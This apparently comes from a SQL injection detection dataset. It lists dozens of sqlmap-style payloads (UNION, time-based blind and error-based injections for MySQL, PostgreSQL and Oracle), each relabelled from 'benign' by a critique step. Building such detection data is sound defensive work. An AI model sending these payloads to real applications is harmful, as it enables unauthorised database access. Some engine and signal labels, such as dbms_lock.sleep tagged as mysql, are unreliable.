payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
"-5528' ) union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5528' ) union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-4589"" ) union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-4589"" ) union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 where 7196 = 7196 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1 where 7196 = 7196 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1 where 6881 = 6881 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),error_based,mysql,"1 where 6881 = 6881 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-5130' ) ) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5130' ) ) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-7797'+ ( select oulr where 7091 = 7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-7797'+ ( select oulr where 7091 = 7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" union all select null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" union all select null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) union all select null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) union all select null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-9661"" ) ) ) union all select 2158,2158,2158--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-9661"" ) ) ) union all select 2158,2158,2158--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%' ) union all select null,null,null,null,null,null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1%' ) union all select null,null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
begin if ( 5624 = 5624 ) then dbms_lock.sleep ( 5 ),benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,begin if ( 5624 = 5624 ) then dbms_lock.sleep ( 5 ),False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'dbms_lock.sleep' detected
"1 ) where 2044 = 2044 or elt ( 6272 = 6272,sleep ( 5 ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1 ) where 2044 = 2044 or elt ( 6272 = 6272,sleep ( 5 ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-1949 ) as smyn where 4066 = 4066 union all select 4066,4066--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1949 ) as smyn where 4066 = 4066 union all select 4066,4066--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-4522"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""mbkq"" = ""mbkq",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'xmltype' (likely false negative),error_based,oracle,"-4522"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""mbkq"" = ""mbkq",False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
"-2028' ) ) ) union all select 8698,8698,8698,8698#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-2028' ) ) ) union all select 8698,8698,8698,8698#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 union all select null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 union all select null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-3852' ) union all select 3577,3577,3577,3577,3577,3577,3577,3577#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-3852' ) union all select 3577,3577,3577,3577,3577,3577,3577,3577#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) ) as jxvv where 6593 = 6593 or elt ( 6272 = 6272,sleep ( 5 ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1' ) ) as jxvv where 6593 = 6593 or elt ( 6272 = 6272,sleep ( 5 ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1 ) where 5232 = 5232 union all select null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 ) where 5232 = 5232 union all select null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-8943%' ) union all select 7710,7710#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-8943%' ) union all select 7710,7710#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%' union all select null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1%' union all select null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-5744 ) union all select 3617,3617,3617,3617,3617,3617--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5744 ) union all select 3617,3617,3617,3617,3617,3617--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1' ) or sleep ( 5 ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1' ) or sleep ( 5 ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxrb' = 'zxrb",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,mysql,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxrb' = 'zxrb",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'updatexml' (likely false negative),boolean_blind,mysql,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" where 1831 = 1831 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" where 1831 = 1831 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"-2116%' ) ) ) union all select 7119,7119,7119,7119,7119--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-2116%' ) ) ) union all select 7119,7119,7119,7119,7119--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 8126 = 8126",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 8126 = 8126",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
1'+ ( select uhsy where 4596 = 4596 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1'+ ( select uhsy where 4596 = 4596 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1 ) where 8630 = 8630 union all select null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 ) where 8630 = 8630 union all select null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' in boolean mode ) union all select null,null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' in boolean mode ) union all select null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-5386' ) union all select 8026,8026,8026,8026,8026,8026#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5386' ) union all select 8026,8026,8026,8026,8026,8026#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" union all select null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" union all select null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'hokd' = 'hokd,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,postgresql,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'hokd' = 'hokd,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
"1' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""grct"" = ""grct",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""grct"" = ""grct",False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"-2417 ) union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-2417 ) union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'updatexml' (likely false negative),boolean_blind,mysql,"1%"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""%"" = """,False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-6478"" ) ) union all select 7087,7087,7087,7087,7087,7087,7087,7087--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-6478"" ) ) union all select 7087,7087,7087,7087,7087,7087,7087,7087--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-3725' ) ) union all select 1541,1541,1541,1541,1541#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-3725' ) ) union all select 1541,1541,1541,1541,1541#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""cxsu"" like ""cxsu",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""cxsu"" like ""cxsu",False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"1"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-6733' ) where 4024 = 4024 union all select 4024,4024,4024,4024#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-6733' ) where 4024 = 4024 union all select 4024,4024,4024,4024#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 7805 = 7805,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 7805 = 7805,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1' ) ) as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'updatexml' (likely false negative),boolean_blind,mysql,"1' ) ) as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-4947' in boolean mode ) union all select 3314,3314#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-4947' in boolean mode ) union all select 3314,3314#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-7101 ) ) ) union all select 4587,4587,4587,4587,4587,4587--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-7101 ) ) ) union all select 4587,4587,4587,4587,4587,4587--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ( 5 ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ( 5 ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
